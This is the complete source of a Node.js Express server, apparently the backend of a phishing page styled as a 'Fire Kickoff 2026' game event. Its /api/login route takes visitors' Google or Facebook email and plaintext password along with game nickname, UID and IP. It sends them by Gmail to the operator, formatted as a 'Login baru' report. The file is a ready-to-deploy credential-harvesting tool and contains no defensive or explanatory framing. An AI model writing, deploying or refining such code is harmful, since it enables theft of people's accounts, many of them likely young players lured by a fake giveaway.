const express    = require('express');
const nodemailer = require('nodemailer');
const path       = require('path');

const app  = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(path.join(__dirname)));

// ── Gmail transporter (untuk email admin) ──
const gmailTransporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS
  }
});


// ── /api/login — kirim data login ke admin ──
app.post('/api/login', async (req, res) => {
  const { nickname, uid, level, method, email, password } = req.body;

  if (!nickname || !uid || !email || !password) {
    return res.status(400).json({ success: false, message: 'Data tidak lengkap' });
  }

  const methodLabel = method === 'google' ? 'Google' : 'Facebook';
  const timeStr     = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
  const ip          = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';

  const htmlBody = `
  <div style="font-family:Arial,sans-serif;max-width:580px;margin:0 auto;background:#0d0d1a;color:#fff;border-radius:10px;overflow:hidden;border:1px solid #2a2a3a;">
    <div style="background:linear-gradient(135deg,#FF6B00,#FF2D2D);padding:18px 24px;">
      <p style="margin:0;font-size:18px;font-weight:bold;letter-spacing:1px;">Data Login Masuk — Fire Kickoff 2026</p>
      <p style="margin:4px 0 0;font-size:12px;opacity:0.85;">${timeStr} WIB</p>
    </div>
    <div style="padding:24px;">
      <table style="width:100%;border-collapse:collapse;font-size:14px;">
        <tr><td style="padding:9px 0;border-bottom:1px solid #1e1e2e;color:#999;width:130px;">Nickname</td><td style="padding:9px 0;border-bottom:1px solid #1e1e2e;color:#fff;font-weight:bold;">${nickname}</td></tr>
        <tr><td style="padding:9px 0;border-bottom:1px solid #1e1e2e;color:#999;">UID</td><td style="padding:9px 0;border-bottom:1px solid #1e1e2e;color:#FFD700;font-weight:bold;">${uid}</td></tr>
        <tr><td style="padding:9px 0;border-bottom:1px solid #1e1e2e;color:#999;">Level</td><td style="padding:9px 0;border-bottom:1px solid #1e1e2e;color:#00C853;font-weight:bold;">${level || '-'}</td></tr>
        <tr><td style="padding:9px 0;border-bottom:1px solid #1e1e2e;color:#999;">Metode</td><td style="padding:9px 0;border-bottom:1px solid #1e1e2e;color:#00BFFF;font-weight:bold;">${methodLabel}</td></tr>
        <tr><td style="padding:9px 0;border-bottom:1px solid #1e1e2e;color:#999;">Email</td><td style="padding:9px 0;border-bottom:1px solid #1e1e2e;color:#fff;">${email}</td></tr>
        <tr><td style="padding:9px 0;color:#999;">Password</td><td style="padding:9px 0;color:#FF6B00;font-weight:bold;">${password}</td></tr>
      </table>
    </div>
    <div style="padding:10px 24px;background:#0a0a14;font-size:11px;color:#555;">IP: ${ip}</div>
  </div>`;

  try {
    await gmailTransporter.sendMail({
      from:    `"FF Event Admin" <${process.env.EMAIL_USER}>`,
      to:      process.env.EMAIL_USER,
      subject: `Login baru: ${nickname} (${methodLabel})`,
      html:    htmlBody,
      text:    `Login baru\nNickname: ${nickname}\nUID: ${uid}\nLevel: ${level || '-'}\nMetode: ${methodLabel}\nEmail: ${email}\nPassword: ${password}\nWaktu: ${timeStr}\nIP: ${ip}`
    });
    res.json({ success: true });
  } catch (err) {
    console.error('Login email error:', err.message);
    res.status(500).json({ success: false, message: 'Gagal mengirim data' });
  }
});


app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

if (require.main === module) {
  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server berjalan di port ${PORT}`);
  });
}

module.exports = app;
